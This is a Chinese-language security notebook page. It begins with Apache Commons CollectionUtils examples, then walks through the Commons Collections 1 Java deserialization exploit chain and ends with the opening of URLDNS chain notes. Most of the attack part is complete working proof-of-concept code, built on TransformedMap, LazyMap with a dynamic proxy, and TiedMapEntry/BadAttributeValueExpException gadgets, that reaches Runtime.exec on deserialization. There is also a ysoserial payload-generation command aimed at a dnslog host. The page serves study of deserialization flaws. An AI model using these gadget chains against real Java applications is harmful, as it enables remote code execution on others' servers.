CollectionUtils 类提供各种实用方法，用于覆盖广泛用例的常见操作。 它有助于避免编写样板代码。 这个库在 jdk 8 之前是非常有用的，但现在 Java 8 的 Stream API 提供了类似的功能。 检查是否为空元素 CollectionUtils 的 addIgnoreNull() 方法可用于确保只有非空 (null) 值被添加到集合中。 返回值：如果集合已更改，则返回为 True。 List list = new LinkedList(); boolean result1 = CollectionUtils.addIgnoreNull(list, null); System.out.println(result1); // false boolean result2 = CollectionUtils.addIgnoreNull(list, \"a\"); System.out.println(result2); // true System.out.println(list); // [a] System.out.println(list.contains(null)); // false list.add(null); System.out.println(list); // [a, null] System.out.println(list.contains(null)); // true 合并两个排序列表 CollectionUtils 的 collate() 方法可用于合并两个已排序的列表。 返回值：一个新的排序列表，其中包含集合 a 和 b 的元素。 List sortedList1 = Arrays.asList(\"A\", \"C\", \"E\"); List sortedList2 = Arrays.asList(\"B\", \"D\", \"F\"); List mergedList = CollectionUtils.collate(sortedList1, sortedList2); System.out.println(mergedList); // [A, B, C, D, E, F] 转换列表 CollectionUtils 的 collect() 方法可用于将一种类型的对象列表转换为不同类型的对象列表。 返回值：转换结果 (新列表)。 List stringList = Arrays.asList(\"1\", \"2\", \"3\"); List integerList = (List) CollectionUtils.collect(stringList, new Transformer() { @Override public Integer transform(String input) { return Integer.parseInt(input); } }); System.out.println(integerList); // [1, 2, 3] 过滤列表 CollectionUtils 的 filter() 方法可用于过滤列表以移除不满足由谓词传递提供的条件的对象。 返回值：如果通过此调用修改了集合，则返回 true，否则返回 false。 List integerList = new ArrayList(); integerList.addAll(Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8)); System.out.println(integerList); // [1, 2, 3, 4, 5, 6, 7, 8] CollectionUtils.filter(integerList, new Predicate() { @Override public boolean evaluate(Integer input) { if (input.intValue() % 2 == 0) { return true; } return false; } }); System.out.println(integerList); // [2, 4, 6, 8] 检查非空列表 CollectionUtils 的 isNotEmpty() 方法可用于检查列表是否为 null 而不用担心 null 列表。 因此，在检查列表大小之前，不需要将无效检查放在任何地方。 返回值：如果非空且非 null，则返回为:true。 检查空的列表 CollectionUtils 的 isEmpty() 方法可用于检查列表是否为空。 返回值：如果为空或为 null，则返回为 true。 检查子列表 CollectionUtils 的 isSubCollection () 方法可用于检查集合是否包含给定集合。 参数 a - 第一个 (子) 集合不能为空。 b - 第二个 (超集) 集合不能为空。 当且仅当 a 是 b 的子集合时才为 true。 检查相交 CollectionUtils 的 intersection() 方法可用于获取两个集合 (交集) 之间的公共对象部分。 参数 a - 第一个 (子) 集合不能为 null。 b - 第二个 (超集) 集合不能为 null。 返回值：两个集合的交集。 求差集 CollectionUtils 的 subtract() 方法可用于通过从其他集合中减去一个集合的对象来获取新集合。 参数 a - 要从中减去的集合，不能为 null。 b - 要减去的集合，不能为 null。 返回值：两个集合的差集 (新集合)。 求联合集 CollectionUtils 的 union() 方法可用于获取两个集合的联合。 参数 a - 第一个集合，不能为 null。 b - 第二个集合，不能为 null。 返回值：两个集合的联合。 参考教程 Apache Commons Collections教程 Commons Collections1 分析 前言 Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。 Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 前置知识 POC示例 先引入依赖 commons-collections commons-collections 3.1 网上的一个POC，先看下涉及哪些类； 因为在调试这条链的时候会涉及到一些没接触过的类，在调试前需要了解到这些类的一个作用，方便后面的理解。 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) { //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式 onlyElement.setValue(\"foobar\"); } } 先运行下查看结果。 成功执行了系统命令。 Transformer Transformer是Commons Collections中提供的一个接口，只有一个待实现的transform方法。 ConstantTransformer ConstantTransformer是接口Transformer的实现类 它的过程就是在构造函数的时候传⼊⼀个对象，并在transform⽅法将这个对象再返回，其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。 InvokerTransformer‼️ InvokerTransformer也是Transformer的实现类 在构造方法中有三个参数 第⼀个参数是待执⾏的⽅法名 第⼆个参数是这个函数的参数列表的参数类型 第三个参数是传给这个函数的参数列表 里面还提供了一个transform的方法，该方法可以通过Java反射机制来进行执行任意代码。 实现代码举例： 不能直接利用 ChainedTransformer‼️ ChainedTransformer也是实现了Transformer接⼝的⼀个类 看到transform方法是通过传入Trasnformer[]数组来对传入的数值进行遍历并且调用数组对象的transform方法，它的作⽤是将内部的多个Transformer串在⼀起。 通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，将多个Transformer 用过依次调用各自的transform 连接起来，用P牛的⼀个图做示意： 几个Transformer实现类整理 理一理这几个Transfromer。其实一共就三个Transformer,而且这些XxxTransformer都是实现了TransFormer这个接口的，所以他们都有一个transform方法: InvokerTransformer ConstantTransformer ChainedTransformer 构造函数接受三个参数 构造函数接受一个参数 构造函数接受一个TransFormer类型的数组 transform方法通过反射可以执行一个对象的任意方法 transform返回构造函数传入的参数 transform方法执行构造函数传入数组的每一个成员的transform方法 Map Transform来执行命令需要绑定到Map上，抽象类AbstractMapDecorator是Apache Commons Collections提供的一个类，实现类有很多，比如LazyMap、TransformedMap等，这些类都有一个decorate()方法，用于将上述的Transformer实现类绑定到Map上，当对Map进行一些操作时，会自动触发Transformer实现类的tranform()方法，不同的Map类型有不同的触发规则。 TransformedMap‼️ TransformedMap这个类是用来对Map进行某些变换（修饰）用的，例如当我们修改Map中的某个值时，就会触发我们预先定义好的某些操作来对Map进行处理（回调）。 通过decorate函数就可以将一个普通的Map转换为一个TransformedMap。第二个参数和第三个参数分别对应当key改变和value改变时对应transform函数需要做的操作； 举个例子： package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) { Map hashMap = new HashMap(); hashMap.put(\"1\", \"2\"); // key修改执行Test中的transform方法，value修改执行Test1中的transform方法 Map transformedMap = TransformedMap.decorate(hashMap, new Test(), new Test1()); // 两个值都修改就会Test和Test1中的transform都执行 transformedMap.put(\"3\", \"4\"); System.out.println(\"\\n--- 分界线 ---\\n\"); Map.Entry transformedMapValue = (Map.Entry) transformedMap.entrySet().iterator().next(); // 值改变会执行 Test1类 中的transform方法 transformedMapValue.setValue(\"5\"); } } class Test implements Transformer { @Override public Object transform(Object o) { System.out.println(\"Test Object: \" + o.toString()); return \"Test Object\"; } } class Test1 implements Transformer { @Override public Object transform(Object o) { System.out.println(\"Test1 Object: \" + o.toString()); return \"Test1 Object\"; } } 即Transformer实现类（如ChainedTransformer）分别绑定到Map的key和value上，当map的key或value被修改时，会调用对应Transformer实现类的transform()方法去进行一些变换操作。 为什么会这样？为什么put了就会触发transform方法？ 看一下TransformedMap.put这个方法，发现在put操作的时候，会直接调用类函数中的transformKey和transformValue去处理 然后这俩个类函数返回的是我们传入的Transformer实现类去执行transform方法 所以我们put了过后就触发了。 调用setValue触发同理；TransformedMap里的每个entryset在调用setValue方法时会自动调用TransformedMap类的checkSetValue方法 我们可以把chainedtransformer绑定到一个TransformedMap上，当此map的key或value发生改变时，就会自动触发chainedtransformer。 Map.Entry Map.Entry是Map的一个内部接口。 Map.Entry是Map声明的一个内部接口，此接口为泛型，定义为Entry。它表示Map中的一个实体（一个key-value对）。接口中有getKey()、getValue()方法。 反射exec 在Java中执行命令一般通过Runtime.getRuntime().exec(\"command\")来执行命令，如果我们想在修改transformedMap时执行命令，就需要构造一个特殊的ChainedTransformer来反射出exec函数。 反射利用链 分析ChainedTransformer中的transform方法可以发现，这个链中，会将上一次变换的结果作为下一次变换的输入，直到所有的变换完成，并返回最终的object 再分析InvokerTransformer中的transform方法可以发现，这地方就是通过给定的object，然后通过.getClass、.getMethod、.invoke的方法进行反射，达到调用指定方法的目的。 所以我们构造的ChainedTransformer的链中，最终的执行应该是类似于： ((Runtime)Runtime.class.getMethod(\"getRuntime\").invoke(Runtime.class)).exec(\"open -na Calculator\"); 因此链的第一步，就是获取Runtime的类，可以通过内置的ConstantTransformer来获取 这时链就变成了 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class) }; Transformer transformerChain = new ChainedTransformer(transformers); 第二步就是通过InvokerTransformer来反射调用getMethod方法，参数是getRuntime，以此来获取到Runtime.class.getMethod(\"getRuntime\")，上面也提过，InvokerTransformer共接受3个参数 第⼀个参数是待执⾏的⽅法名，此处则为getMethod 第⼆个参数是这个函数的参数列表的参数类型，查看getMethod方法的定义，第一个参数是字符串String，第二个参数是Class，代表第二个参数是可变类参数，所以这里是Class[].class，所以此处应写为new Class[] {String.class, Class[].class} 第三个参数是传给这个函数的参数列表，为调用getMethod时候实际传入的参数（需要和第二步里面统一），即为new Object[]{\"getRuntime\", new Class[0]}（new Class[0]可以理解为占位符，如果给这个函数传入null的话，会直接抛出空指针异常；如果传入new Class[0]的话就不会抛异常。） 因此此时的链就变成了 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}) }; Transformer transformerChain = new ChainedTransformer(transformers); 然后用同样的方法构造出.invoke(Runtime.class))和.exec(\"open -na Calculator\")即可 再举一个构造InvokerTransformer的例子，.invoke(Runtime.class))吧 第一个参数方法名：invoke 第二个参数参数列表的参数类型：new Class[]{Object.class, Object[].class} 第三个参数就是传入的参数列表，此处是Runtime.class，写成：new Object[]{Runtime.class, new Object[0]} 最终的链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); 链构造好了，只需要构造一个使用这个链的TransformedMap的对象，然后修改里面的内容即可触发命令执行了。 Map innerMap = new HashMap(); innerMap.put(\"1\", \"2\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"3\", \"4\"); 效果 简化链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; 上⾯的命令执⾏只是一个demo，它只是⼀个⽤来在本地测试的类，是不能直接在目标上执行的。 在实际过程中，是需要结合反序列化漏洞，将上⾯最终⽣成的outerMap对象变成⼀个序列化流让目标进行反序列化，达到远程命令执行的目的。 使用AnnotationInvocationHandler触发反序列化 环境要求：JDK 1.7 下载地址，建议选JDK 7u21 分析 到目前为止，我们已经构造出了可以执行命令的恶意链。 到这一步，正常的代码审计过程中，会采取两种策略，一种是继续向上回溯，找transformKey、transformValue、checkSetValue这几个方法被调用的位置，另一种策略就是全局搜索readObject()方法，看看有没有哪个类直接就调用了这三个方法中的一个或者readObject中有可疑的操作，最后能够间接触发这几个方法。审计中，一般都会把两种策略都试一遍。 现在只要找到一个符合以下条件的类，并且服务端有反序列化的入口，就可以RCE了。 该可序列化的类重写了readObject方法； 该类在readObject方法中对Map类型的变量进行了键值修改操作，并且这个Map参数是可控的； 根据上面的条件，大佬们找到了rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class这个类； 这个类有一个成员变量 memberValues是Map类型，并且在重写的 readObject() 方法中有 memberValue.setValue() 修改Value的操作。 注意这个必须要JDK7，JDK8是没有这个问题的 根据刚才的反射exec章节 核心的逻辑就是： 实例化一个AnnotationInvocationHandler类，将其成员变量memberValues赋值为精心构造的恶意TransformedMap对象。然后将其序列化，提交给未做安全检查的Java应用。Java应用在进行反序列化操作时，执行了readObject()函数，修改了Map的Value，则会触发TransformedMap的变换函数transform()，再通过反射链调用了Runtime.getRuntime.exec(\"XXX\") 命令，最终就可以执行我们的任意代码了。 POC构建过程 通过反射调用AnnotationInvocationHandler的构造函数，给构造的恶意链传进构造参数中，生成对象o； AnnotationInvocationHandler 构造函数 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Retention.class, outerMap); // 暂时用Retention.class，后面会分析为啥 对对象o进行序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); 但是在writeObject的时候报了一个反序列化的错误： 主要原因是因为Runtime类是没有实现 java.io.Serializable 接⼝的，所以是不允许被序列化。 但是我们可以通过反射来获取到当前上下⽂中的Runtime对象，⽽不需要直接使⽤这个类（也就是我们最开始的POC示例中的Transformer[]）： Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; 可以看到成功序列化了，但是反序列化后并没有触发计算器，也就是说并没有成功执行命令。 解决思路：触发需要满足以下两个条件： sun.reflect.annotation.AnnotationInvocationHandler构造函数的第⼀个参数必须是 Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设⽅法名是X； 被TransformedMap.decorate修饰的Map中必须有⼀个键名为X的元素。 不懂为什么必须要这样，调试分析一下。 查看readObject代码，发现在setValue前有两个if语句 if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); } } 先在 if (var7 != null)这下断点，然后调试，发现 var7 确实是 null，所以没有执行命令成功 分析一下，var7值是从var3.get(var6)获取来的 var3是一个map，键是我们构造AnnotationInvocationHandler对象传入的第一个对象（Retention.class）中的方法名（这里是value），而值就是这个方法return的类（这里是class java.lang.annotation.RetentionPolicy）。 var6则是我们创建innerMap时put的键值对中的键 放个图大概说明下： 所以只需要我们创建的innerMap中的键包含在var3的键中即可，也就是说innerMap中的键必须是AnnotationInvocationHandler构造函数的第一个参数（这里是Retention.class）对应类中的方法名value 构造innerMap像下图这样 再调一下，这个时候的var7满足不等于null了 然后看第二个if语句 需要满足条件： var7.isInstance(var8) ==> false // 满足第一个if条件后，var7就是innerMap中输入的键值对应Annotation子类方法返回的类型，也就是var3对应键的值 var8 instanceof ExceptionProxy ==> false // var8就是我们创建的innerMap中输入的键值对中的值 这个就比较简单，满足条件即可。 到这就比较清楚反序列化后面2个if语句的限制了，我们也可以用其他的Annotation的子类即可，举个例子： 随便找个Annotation子类 构建对象 // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Action.class, outerMap); 查看Action.class的源码 使用方法input，返回类型是String，所以我们创建的innerMap的put的键值对中，键是input 由于var7.isInstance(var8) ==> false，所以我们innerMap的put的键值对中的值类型不能是String 所以构造如下： Map innerMap = new HashMap(); innerMap.put(\"input\", 1); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 运行 成功反序列化执行了命令。 完整POC package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.ws.Action; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException { System.out.println(String.class.isInstance(\"\")); // 利用链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"input\", 1); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Action.class, outerMap); // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); } } 整体思路 我们构造恶意的AnnotationInvocationHandler类，将该类的成员变量memberValues赋值为我们精心构造的TransformedMap对象，并将AnnotationInvocationHandler类进行序列化，然后交给目标JAVA WEB应用进行反序列化。在进行反序列化时，会执行readObject()方法，该方法会对成员变量TransformedMap的Value值进行修改，该修改触发了TransformedMap实例化时传入的参数InvokerTransformer的transform()方法，InvokerTransformer.transform()方法通过反射链调用Runtime.getRuntime.exec(“xx”)函数来执行系统命令。 使用LazyMap利用链 介绍 LazyMap和TransformedMap类似，都继承 AbstractMapDecorator。 而TransformedMap是在写入元素的时候执行transform方法，LazyMap是在其get方法中执行的 this.factory.transform。 LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用 this.factory.transform 方法去获取一个值 public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } 而this.factory也是我们可以控制的，在构造函数中。 protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\"Factory must not be null\"); } else { this.factory = factory; } } 所以构造poc的时候只要令factory为精心构造的ChainedTransformer就行，因此我们找一下哪里可能调用了LazyMap的get方法。 但是我们在AnnotationInvocationHandler#readObject函数中并没有看到有执行get方法，所以ysoserial找到了另一条路，AnnotationInvocationHandler类的invoke方法有调用到get： AnnotationInvocationHandler#invoke看到invoke方向就大概联想到Java的动态代理机制。 动态代理复习 总结为一句话就是，被动态代理的对象调用任意方法都会通过对应的InvocationHandler的invoke方法触发 这里再举个例子说明一下如何自动调用的invoke方法 InvocationHandlerExample.class InvocationHandlerExample类继承了InvocationHandler，实现了invoke方法，作用是在监控到调用的方法名是get的时候，返回一个特殊字符串 Hacked Object 。 package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.Map; public class InvocationHandlerExample implements InvocationHandler { protected Map map; public InvocationHandlerExample(Map map){ this.map = map; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if (method.getName().compareTo(\"get\") == 0){ System.out.println(\"HOOK Method: \" + method.getName()); return \"Hacked Object\"; } return method.invoke(this.map, args); } } App.class 在App类中调用这个InvocationHandlerExample package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) { InvocationHandler handler = new InvocationHandlerExample(new HashMap()); // 代理类的逻辑 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler); proxyMap.put(\"1\", \"2\"); System.out.println(proxyMap.get(\"1\")); } } 可以看到调用的get方法，但是被我们动态代理中的invoke方法拦截了，返回了Hacked Object 也就是说这个Map对象经过动态代理处理之后，动态代理对象调用任何一个方法时会调用handler中的invoke方法。 我们回看sun.reflect.annotation.AnnotationInvocationHandler，会发现实际上这个类实际就是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 所以我们只要创建一个LazyMap的动态代理，然后再用动态代理调用LazyMap的某个方法就行了，但是为了反序列化的时候自动触发，我们应该找的是某个重写了readObject方法的类，这个类的readObject方法中可以通过动态代理调用LazyMap的某个方法，其实这和直接调用LazyMap某个方法需要满足的条件几乎是一样的，因为某个类的动态代理与它本身实现了同一个接口。而我们通过分析TransformedMap利用链的时候，已经知道了在AnnotationInvocationHandler的readObject方法中会调用某个Map类型对象的entrySet()方法，而LazyMap以及他的动态代理都是Map类型，所以，一条利用链就这么出来了 构建POC 对sun.reflect.annotation.AnnotationInvocationHandler对象进行Proxy // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // 创建LazyMap的handler实例 InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap); // 创建LazyMap的动态代理实例 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // 动态代理对象，执行任意方法，都会到invoke中去 代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是 sun.reflect.annotation.AnnotationInvocationHandler#readObject，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹（我们需要的是AnnotationInvocationHandler这个类的对象） // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); // readObject的时候主动调用proxyMap的方法进入到invoke中 完整POC package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import javax.xml.ws.Action; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException { System.out.println(String.class.isInstance(\"\")); // 利用链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"input\", 1); Map outerMap = LazyMap.decorate(innerMap, transformerChain); // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // 代理对象 handler = (InvocationHandler) constructor.newInstance(Action.class, proxyMap); // 包裹 // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(handler); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); } } LazyMap利用链补充 上面的利用链受限于jdk1.7版本，我们来看一看另外一种利用方式，这条利用链不是用动态代理的方式触发了 从上一条利用链我们已经知道LazyMap类的get方法中调用了transform方法，那么除了AnnotationInvocationHandler的invoke方法中调用了get方法外，还有没有其他的地方也调用了get方法呢?当然有，TiedMapEntry类的getValue方法也调用了get方法 而且this.map我们也可以控制，但是我们最终要找的还是readObject方法中的触发点，所以继续网上找，看看哪里调用了TiedMapEntry的getValue方法，找到TiedMapEntry类的toString方法： public String toString() { return this.getKey() + \"=\" + this.getValue(); } toString方法在进行字符串拼接或者手动把某个类转换为字符串的时候会被调用，所以，现在我们找找把TiedMapEntry的对象当做字符串处理的地方，找到了BadAttributeValueExpException的readObject方法中有相关调用： 可以看到第三个if分支里调用了valObj.toString(),而valObj=gf.get(\"val\", null),这里其实就是读取传过来对象的val属性值，所以，只要我们控制BadAttributeValueExpException对象的val属性的值为我们精心构造的TiedMapEntry对象就行。所以，就有了下面的poc: package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import javax.xml.ws.Action; import java.io.*; import java.lang.reflect.*; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchFieldException { System.out.println(String.class.isInstance(\"\")); // 利用链 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"123\", 1); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); // 将lazyMap封装到TiedMapEntry中 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"456\"); // 通过反射给badAttributeValueExpException的val属性赋值 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Field val = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); val.setAccessible(true); val.set(badAttributeValueExpException, tiedMapEntry); // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(badAttributeValueExpException); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 模拟目标进行反序列化 ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); } } 参考 Apache-Commons-Collections反序列化漏洞分析 Java安全之Commons Collections1分析前置知识 Java安全学习之ysoserial CommonsCollections1详细分析 java-cc1-反序列化简单分析 JAVA反序列化 - Commons-Collections组件 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/02.URLDNS链分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/02.URLDNS链分析.html","title":"02.URLDNS链分析","keywords":"","body":" URLDNS链利用 动态调试ysoserial URLDNS链分析 思考 总结 URLDNS链利用 先来看看用ysoserial工具怎么利用的。 # 生成序列化Payload java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn/ > a.ser 然后将序列化payload发给对应的目标结合漏洞让他进行反序列化，这里本地直接写个反序列化过程举例了； package org.example; import java.io.FileInputStream; import java.io.IOException; import java.io.ObjectInputStream; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"/Users/d4m1ts/d4m1ts/tools/java/ysoserial/target/a.ser\")); objectInputStream.readObject(); } } DNSLog成功收到了请求 动态调试ysoserial 简而言之，就是给ysoserial项目加载到idea中，方便我们分析调试。 下载ysoserial项目后，导入到idea中，解决掉依赖问题 有的依赖一直装不上，可以新建个maven项目，然后再给不能下载的依赖放到pom.xml，下载后说不定可以解决。 实在不行就手动下载jar然后导入吧 